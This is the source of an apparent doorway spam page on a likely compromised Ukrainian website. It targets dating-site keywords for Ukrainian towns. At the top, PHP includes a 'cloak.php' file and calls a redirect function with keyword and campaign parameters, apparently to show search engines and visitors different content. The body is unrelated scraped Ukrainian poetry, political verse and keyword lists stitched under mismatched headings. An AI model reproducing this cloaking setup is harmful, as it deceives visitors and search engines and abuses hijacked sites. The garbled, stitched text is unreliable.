<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b2%d0%b0%d1%88+%d1%81%d0%b0%d0%b9%d1%82+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d1%83+%d0%9d%d0%be%d0%b2%d0%be%d1%83%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Доставка води Новоукраїнка</title>
	<meta name="description" content="Новоукраїнська районна філія Законом України від № «​Про внесення змін до деяких Далі користувач проходить шлях від пошуку роботи та оформлення документів до поїздки та знайомства із роботодавцем..." />
	<link rel="canonical" href="https://masage.od.ua/img/196/duxal-vash-sayt.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/comif-koledzh-znayomstva.php">коледж знайомства в Першотравенськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/208/vyta-krash-programi.php">кращі програми підключення в Вознесенськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/249/xoge-mstsev-sayti-znayomstv.php">місцеві сайти знайомств в Винники Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/418/kot-sayt-znayomstv-na.php">сайт знайомств на в Щастя Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/208/qotuh-naykrash-bezkoshtovn-sayti.php">найкращі безкоштовні сайти знайомств поблизу Новояворівськ Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Ваш сайт знайомств у Новоукраїнка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Адже прийшли ми вас поздоровлять І випити за всі Ваші медалі: Медаль за чесний труд, за вірність, за терпіння, За те, що ви пустили в білий світ Таких розумних, гарних три створіння. Хай Бог пошле вам щастя і добра, Хай сльози на очах від щастя лиш іскряться, Душею Ви ніколи не була стара- Бажаємо ж завжди такою й залишаться! Шурх - шурх - під ногами шурхочуть Немовби сказати нам хочуть: На цьому життя не вмирає, А новий свій цикл починає… Тож нам сумувати не треба: Підемо за обрій — край неба… Посипляться з клена листочки,  Прийдуть замість нас сини й дочки.</p>
<p>Онуки зіпнуться на ноги,  Побачать той клен край дороги, Букет із листків назбирають- І подумки нас пригадають. Іде рік Новий, А у вас — іменини. І Юрі щоб Ви ще  На «щось» - та й здалася. Як в молоді роки Щоб Ви були здорові, На добрії діла — Завжди напоготові!</p>
		
	<p>Під ним коник вороний, Бо вертав з походу, Гостра шабля за поясом — Ще й гарний на вроду! Козак молоденький Мав серце гаряче: Не одна дівчина По козаку плаче. Зупинивсь біля корчми, Бо дівка моргала — І пропала його доля, Навіки пропала! Приспів: Козак п'є, гуляє, Шинкар наливає, Шинкарева донька Козаку моргає! Пропив козак гроші, І коня, й кресало, Вже на ньому крім штанів, Нічого не стало! Козак п'є, гуляє, Шинкар наливає, Шинкарева донька Козаку моргає!</p>
<p>Ой вертай додому, Молодий козаче, Думай головою, Бо вмреш під корчмою! Козак пє, гуляє, Шинкар наливає, Шинкарева донька  Козаку моргає!</p>
		
			<br><ul>
			
				<li>20 заяложених фраз з сайтів знайомств.</li>
			
				<li>ХАРЬКОВА ТЕТЯНА ІВАНІВНА - Новоукраїнська центральна бібліотека?</li>
			
				<li>лесбіянки знайомства чоловік у Рожище Україна.</li>
			
				<li>знайомства з дівчатами в Токмак Україна?</li>
			
				<li>Популярні товари.</li>
			
				<li>місто знайомства поблизу Горлівка Україна.</li>
			
				<li>зона знайомств Словянськ Україна.</li>
			
			</ul>
		
	<p>Ой, не пий, козаче, Ой, не пий, рідненький, Бо хто ж буде захищать Україну — неньку?! Україна просить! З болем та глибоким співчуттям присвячую Валентині Іванівні та Віктору Олексійовичу Чайковським — батькам воїна — афганця,  який загинув у році, маючи 19 років. Сльози матері. Синочку, синку! Орле сизий!</p>
<p>Чужі люди, чужа віра, Чужа та країна! Які ж бо — то лиходії Забрали в нас сина?! Хай прокляті навіки будуть Ті, хто почав війну в Афгані, Хто тисячі синів прислав нам Назад — у «чорному тюльпані»! За що? За що так поступила доля З тобою, з ними — з багатьма? Єднаймось матері усього світу!</p>
<p>Єднаймось проти зброї і війни!</p><a id='e1'></a><h3>Акції та новини</h3><p>Хай сміються під сонечком радісно діти. Хай живими залишаться Ваші сини… …Сльози матері зрошують чорний граніт, Протирає хустинкою сина лице,  Батько в розпачі стис кулаки — і мовчить… Хто їм скаже: як витерпіть горе оце?! Дещо про кадри   Осла призначили послом    У лісовому темнім царстві. Він там такого наробив:   Крота — копитами забив,   Затіяв сварку із ведмедем    За те, що мало дав той меду —   Пересварив усих з усими :   Сварились тигри і слони ,   Лисиці ,зайці, кабани —   Не стало злагоди між ними! Здійнявсь у лісі шум і гам…   Аж гульк — Цар Лев з'явився сам   Розсердивсь він , роззявив пащу —   І ні осла ,ані посла ,   Така вже доленька пропаща!</p>
<p>Мораль у байці сій така :   Не вір у розум Ішака,   Не призначай його послом —    Бо станеш сам тоді Ослом! Хай не образиться Мій батько на тім світі Як я скажу: велика слава Богу, Що він забрав його до себе Ще в ті далекі, брєжнєвські часи, Що він не бачить того лихоліття, Яке спіткало нашу Україну, Він — політрук із Сталінграда Шалений вік двадцятий, Рік сорок пятий: Вони верталися додому по війні, На грудях — іпостась із орденів, медалей, А в серці — радість, Що залишились живі, І гордість за країну, за народ, Які змогли здобути Перемогу У тій нещадній Боротьбі з фашизмом, Й пекучий біль за друзів, За батьків і матерів, Братів, сестер, дітей.</p>
<p>Що згинули У тій війні проклятій Лежала Україна у руїнах — Та їхні руки рвались до роботи, Їм не терпілось Пересісти з танка — На трактор чи комбайн, Пшеницю сіяти, Косу в руках тримати, Завод відбудувати І колгосп підняти, З коханою світанки зустрічати Їм все було по силах , по плечу, Бо все навкруг — то їхнє, рідне, Наше — не чужинське І за пятнадцять років Вкраїна піднялася із руїн І розцвіла, як квітка, у вінку Республік братніх!..</p>
		
			<br><ul>
			
				<li>Новий сайт знайомств у Винники Україна.</li>
			
				<li>знайомства одинаки поблизу Лиман Україна.</li>
			
				<li>Иванов Олег Владимирович!</li>
			
				<li>найкращі швидкісні знайомства Павлоград Україна?</li>
			
				<li>Selected by filters: 107.</li>
			
				<li>Поиск анкет!</li>
			
				<li>локальне підключення в Перевальськ Україна.</li>
			
			</ul>
		
	<p>Державу розвалили — Ми мовчали, І зараз мовчимо, Тому і маємо ми  Те, що маєм! За п'ятнадцять років Тієї «незалежності» Простіше «дерибану», Спустошили «нові українці» Країну, Неначе хан Батий Пройшовся по землі: Заводи наші — он стоять, Розіьрані до цурки на метали, Колгоспи наші — Не минули теж біди: Їх розтягнули, що куди, Все продали, Все «прихватизували», Людей у ярма знову запрягли Пани лукаві.</p>
<p>Їм оце ще тільки Одне залищилось — Земельку прихватить — І все Що ж нам робити далі?</p><a id='e2'></a><h3>ⓘ Новоукраинка (Ровненская область)</h3><p>Хай комуністи і соціалісти, І прогресивні наші соціалісти, І робітнича партія, й селянська, І всі — Кому болить за Україну, З'єднаються в одну, Могутню силу. Хай не гризуться між собою — Хто лівіший, Не б'ються За портфелі, булаву, А напрацюють спільно Ту програму — одну — Для дійсних патріотів України, Яка була б прийнятна Для всіх партій,- І з нею ми підем на вибори, Бо це, мабуть, що буде вже Останній наш Рішучий бій Всім тим, Хто став міліардером На поті, крові і кістках Наших батьків, Що збудували все для нас — Прийдешніх поколінь, А зараз ми Не маємо нічого, Крім дулі з маком!</p>
<p>Єднаймося, друзі мої! Єднаймося, люди! Єднаймося, бо ще трохи — І вже пізно буде!..</p><strong><a id='e3'></a><h2>Як знайомитися в інтернеті: ставте високу планку, будьте лаконічними і терплячими</h2></strong><p>День згаса, шепочуть трави, Віє вітер степовий. Сонце сіло. Відгриміли Вже салюти, речі. Гам, Вічності вогонь палає Все завмерло там. Обеліск до неба пнеться, Хрест понурився, мовчить, У підніжжя — різноквіття Скільки ж хлопців тут лежить! Росіян, вірмен, узбеків, Українців, латишів На міуському плацдармі Куля їх дістала всіх У могилі Гул тихенько нароста, Тіні, тіні, тіні,тіні, Сходяться біля Хреста  То все душі убієнних — Тисячі їх тут лягло-  В серпні, в році сорок третім, Справжнє пекло тут було. Шурхіт, шелест, шепіт, шепіт Швидко шириться між них, Ось вже можна упізнати Їх, колишніх, тих — живих!</p>
<p>Скрізь обійми, привітання, Честь солдатську віддають, В П'ятій армії ударній Згадують свій славний путь, Побратимів, що сьогодні На могилі в них були.. Їм, звичайно, пощастило, Що кістьми тут не лягли А чи так вже й пощастило? Може краще тут лежать? Бо живим ще ветеранам Нерви є кому псувать! Пам'ятаєте дивізію СС «Галичина»? Скільки наших положила, Покалічила вона!</p>
<p>А тепер оті Іуди — «Українці щирі»- В славі, почесті усюди, Де ж ваш розум, люди?! Президент їм потурає, Його «любі друзі», Ох, отримають ці люди Колись по заслузі! Вертолітом він сьогодні З Києва прибув, Слухав люд облудні речі Й суперечно гув! Бо розп'яли Україну, Грабують, гвалтують, Ані крику, ні стогону — Нічого не чують! На святиню зазіхають- На Дев'яте травня: Пропонують відмінити Свято наше славне!</p>
<p>Що ж робити, побратими? Треба думу думать Може нас козак Савура Чомусь напоумить?..</p><strong><a id='e4'></a><h2>ХАРЬКОВА ТЕТЯНА ІВАНІВНА - Новоукраїнська центральна бібліотека</h2></strong><p>Стали тихо, у пошані Голови схиляють, Поклонилися могилі Й козака питають: «Батьку наш! Козак Савура! Линуть часу хвилі, Вже віки пройшли, як впав ти На оцій могилі! Боронив ти рідну землю Від навал чужинців, Порубаний шаблюками Татарів — ординців, Ти скажи: за що Вкраїні Усі оці муки? Доки будуть діти наші У сльозах розпуки? За що, про що така кара Неньці — Україні? Ти порадь їм, друже — брате: Що робити нині? А Вас поважаю, А тому сказати мушу Те, що в серці маю!</p>
		
	<p>Укожного Його з краю хата. Їхня ж сила — у єднанні, А не у розбраті, Тільки так можна навести Лад у власній хаті! Якщо кожен буде гордий: Я — син України, То тоді держава наша Ніколи не згине!.. Чи мені наснилось?.. Тот - моложе, Этот — старше — Никого не пропускают!.. Чом ти сидиш, впустивши руки?</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/335/wemi-znayomstva-z.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/103/hin-gachok-zaporzhzhya.php">гачок Запоріжжя Україна</a></li><li><a href="https://masage.od.ua/img/428/behyn-sayti-znayomstv.php">сайти знайомств людина Звенигородка Україна</a></li><li><a href="https://masage.od.ua/img/418/naj-krash-sayti-znayomstv.php">кращі сайти знайомств в Інтернеті Кремінна Україна</a></li><li><a href="https://masage.od.ua/img/335/neg-sayti-dlya-doroslih.php">сайти для дорослих знайомств Долина Україна</a></li><li><a href="https://masage.od.ua/img/196/vam-pdklyuchiti-sayt.php">підключити сайт в Феодосія Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#e1'>Акції та новини</a></li>
<li><a href='#e2'>ⓘ Новоукраинка (Ровненская область)</a></li>
<li><a href='#e3'>Як знайомитися в інтернеті: ставте високу планку, будьте лаконічними і терплячими</a></li>
<li><a href='#e4'>ХАРЬКОВА ТЕТЯНА ІВАНІВНА - Новоукраїнська центральна бібліотека</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/335/qijyd-veb-sayt-azatskih.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>